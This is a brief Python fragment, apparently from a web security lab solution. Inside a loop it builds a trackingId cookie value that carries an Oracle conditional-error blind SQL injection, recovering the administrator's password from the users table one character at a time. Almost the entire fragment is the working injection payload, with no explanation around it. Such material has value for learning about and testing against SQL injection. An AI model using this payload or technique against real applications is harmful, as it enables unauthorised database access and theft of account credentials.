...
while True:
    ...
    for char in chars:
        trackingId=f"' OR (SELECT CASE WHEN (SUBSTR((SELECT password FROM users WHERE username='administrator'), 1, {len(password)+1}) = '{password}{char}') THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a"
